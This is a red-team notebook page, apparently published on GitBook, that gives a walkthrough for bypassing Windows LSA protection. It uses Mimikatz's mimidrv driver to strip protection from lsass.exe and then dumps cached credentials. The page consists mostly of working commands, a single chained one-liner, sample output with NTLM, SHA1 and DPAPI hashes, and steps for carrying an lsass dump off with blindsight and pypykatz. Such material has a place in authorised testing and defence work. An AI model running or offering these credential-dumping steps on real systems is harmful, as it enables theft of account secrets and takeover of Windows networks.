---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/protected-lsass
---

# Protected LSASS

## Protected LSASS

To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in

```powershell
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1
```

<figure><img src="../../../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

If the LSA protection is enabled, we will get an error executing the **"sekurlsa::logonpasswords"** command.

```powershell
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

<figure><img src="../../../../.gitbook/assets/image (936).png" alt=""><figcaption></figcaption></figure>

The command returns a **0x00000005** error code message **(Access Denied)**. Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing **"!+"** as follows,

{% code title="Loading the mimidrv Driver into Memory" %}
```powershell
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```
{% endcode %}

Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

{% code title="Removing the LSA Protection" %}
```powershell
mimikatz # privilege::debug
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```
{% endcode %}

Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.

```powershell
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 815631 (00000000:000c72ab)
Session           : RemoteInteractive from 2
User Name         : khan.chanthou
Domain            : VULNABLEONE
Logon Server      : CREDS-HARVESTIN
Logon Time        : 9/23/2023 4:46:21 AM
SID               : S-1-5-21-2366530601-1185510722-10638911-1114
        msv :
         [00000003] Primary
         * Username : khan.chanthou
         * Domain   : VULNABLEONE
         * NTLM     : ab525c9683e8fe067395ba2ddc971831
         * SHA1     : f33d7244aa8727f5139b01d8959141960aad5d21
         * DPAPI    : ed09e2e4f70ef66a400b8358c52a4649
```

We can use one-liner

{% code overflow="wrap" %}
```powershell
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
```
{% endcode %}

Another Method

[https://github.com/0xdea/blindsight.git](https://github.com/0xdea/blindsight.git)

{% code overflow="wrap" %}
```bash
.\blindsight.exe
.\blindsight.exe .\<YOUR_LOG>.log
```
{% endcode %}

The resulting lsass.dmp file is a large file, the download may take a while.

{% code overflow="wrap" %}
```bash
download lsass.dmp

## On our kali
pypykatz lsa minidump lsass.dmp
```
{% endcode %}
